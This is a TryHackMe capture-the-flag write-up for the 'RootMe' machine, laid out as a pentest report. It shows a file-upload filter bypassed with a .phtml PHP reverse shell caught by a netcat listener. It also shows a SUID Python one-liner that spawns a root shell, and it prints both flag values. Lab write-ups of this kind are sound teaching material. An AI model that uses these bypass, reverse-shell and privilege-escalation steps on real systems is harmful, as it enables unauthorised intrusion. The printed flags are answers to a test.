# RootMe – TryHackMe Writeup

## Overview

This report documents the compromise of the **RootMe** TryHackMe machine through web enumeration, unrestricted file upload exploitation, remote code execution via a PHP reverse shell, and privilege escalation using a vulnerable SUID Python binary.

The objective was to gain initial access to the target system, retrieve the user flag, escalate privileges, and obtain the root flag.

---

# Target Information

| Field     | Value         |
| --------- | ------------- |
| Target IP | 10.48.160.144 |
| Platform  | TryHackMe     |
| Room Name | RootMe        |

---

# Executive Summary

The target exposed a web application that contained an insecure file upload functionality. Although PHP files were restricted, the application accepted `.phtml` files, allowing arbitrary PHP code execution.

After uploading a PHP reverse shell and executing it through the uploads directory, a shell was obtained as the web server user (`www-data`).

Privilege escalation was achieved through a misconfigured SUID Python binary that allowed execution of a privileged shell, resulting in full root access.

---

# Methodology

The assessment followed the following phases:

1. Reconnaissance
2. Enumeration
3. Initial Access
4. Privilege Escalation
5. Flag Retrieval

---

# Phase 1 – Reconnaissance

## Host Discovery

### Command

```bash
ping 10.48.160.144
```

### Findings

The target responded to ICMP requests, confirming connectivity.

### Observation

```text
TTL = 62
```

The TTL value suggested that the target was likely running Linux.

---

# Phase 2 – Service Enumeration

## Nmap Scan

### Command

```bash
nmap -sV 10.48.160.144
```

### Results

| Port | Service | Version       |
| ---- | ------- | ------------- |
| 22   | SSH     | OpenSSH 8.2p1 |
| 80   | HTTP    | Apache 2.4.41 |

### Analysis

Only two ports were exposed:

* SSH
* HTTP

Since no credentials were available for SSH, the web application became the primary attack surface.

---

# Phase 3 – Web Enumeration

## Directory Discovery

### Command

```bash
gobuster dir -u http://10.48.160.144 -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt
```

### Results

```text
/panel
/uploads
/css
/js
```

### Analysis

Two directories immediately stood out:

* `/panel`
* `/uploads`

The `/panel` endpoint appeared to provide file upload functionality.

The `/uploads` directory appeared to store uploaded files and allowed directory listing.

---

# Phase 4 – File Upload Exploitation

## Discovering the Upload Functionality

Visiting `/panel/` revealed a file upload form.

### Observation

The application blocked standard PHP files but failed to properly validate alternative PHP extensions.

### Vulnerability

The server accepted files with the `.phtml` extension.

Since Apache treats `.phtml` files as executable PHP code, this effectively bypassed the upload restriction.

### Security Impact

An attacker could upload arbitrary server-side code and execute commands on the system.

---

## Preparing a Reverse Shell

A PHP reverse shell was prepared and renamed with a `.phtml` extension.

Example:

```text
reverse.phtml
```

The file was uploaded successfully through the web application.

---

## Locating Uploaded Files

After the upload completed, the previously discovered `/uploads` directory was inspected.

The uploaded reverse shell was visible inside the directory listing.

### Example

```text
/uploads/reverse.phtml
```

### Analysis

This confirmed:

1. Uploaded files were stored inside a web-accessible directory.
2. Uploaded files could be executed directly through the browser.

---

## Triggering Remote Code Execution

A Netcat listener was started on the attack machine.

### Command

```bash
nc -nvlp 8000
```

The uploaded reverse shell was then executed by browsing to:

```text
http://10.48.160.144/uploads/reverse.phtml
```

### Result

A reverse shell connection was received.

```text
uid=33(www-data)
gid=33(www-data)
groups=33(www-data)
```

### Initial Access

The attacker now had command execution as:

```text
www-data
```

---

# Phase 5 – User Flag

## Locating the Flag

### Command

```bash
find / -name user.txt
```

### Result

```text
/var/www/user.txt
```

### Reading the Flag

```bash
cat /var/www/user.txt
```

### User Flag

```text
THM{y0u_g0t_a_sh3ll}
```

---

# Phase 6 – Privilege Escalation Enumeration

## Searching for SUID Binaries

### Command

```bash
find / -perm -4000 -type f 2>/dev/null
```

### Interesting Finding

```text
/usr/bin/python2.7
```

### Analysis

Python should not normally possess the SUID bit.

A SUID Python interpreter can be extremely dangerous because it allows execution of commands with the privileges of the file owner.

Since the binary was owned by root and had the SUID bit set, it became the primary privilege escalation target.

---

# Phase 7 – Privilege Escalation

## Exploiting SUID Python

### Command

```bash
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

### Explanation

The command launches a shell while preserving elevated privileges using:

```text
sh -p
```

Because the Python interpreter itself was running with root privileges due to the SUID bit, the spawned shell inherited those privileges.

### Verification

```bash
whoami
```

### Result

```text
root
```

Root access was successfully obtained.

---

# Phase 8 – Root Flag

## Reading the Flag

### Commands

```bash
cd /root

cat root.txt
```

### Root Flag

```text
THM{pr1v1l3g3_3sc4l4t10n}
```

---

# Attack Chain

```text
Web Enumeration
        ↓
Discover Upload Form
        ↓
Upload Reverse Shell (.phtml)
        ↓
Execute Reverse Shell
        ↓
Obtain www-data Access
        ↓
Locate User Flag
        ↓
Enumerate SUID Binaries
        ↓
Discover SUID Python 2.7
        ↓
Spawn Root Shell
        ↓
Obtain Root Access
        ↓
Read Root Flag
```

---

# Findings & Vulnerabilities

| ID   | Finding                          | Severity |
| ---- | -------------------------------- | -------- |
| F-01 | Unrestricted File Upload         | Critical |
| F-02 | Executable Upload Directory      | Critical |
| F-03 | Remote Code Execution via .phtml | Critical |
| F-04 | SUID Python Interpreter          | Critical |
| F-05 | Privilege Escalation to Root     | Critical |

---

# Tools Used

### Enumeration

* Nmap
* Gobuster

### Exploitation

* PHP Reverse Shell
* Netcat

### Privilege Escalation

* Linux SUID Enumeration
* Python 2.7

---

# Conclusion

The RootMe machine was compromised through an insecure file upload vulnerability that allowed arbitrary PHP code execution using a `.phtml` file. This provided a shell as the web server user. Further enumeration revealed a SUID-enabled Python interpreter, which was abused to obtain a root shell and retrieve the final flag.

The challenge highlighted common web application weaknesses and demonstrated the importance of secure upload validation and proper privilege management.
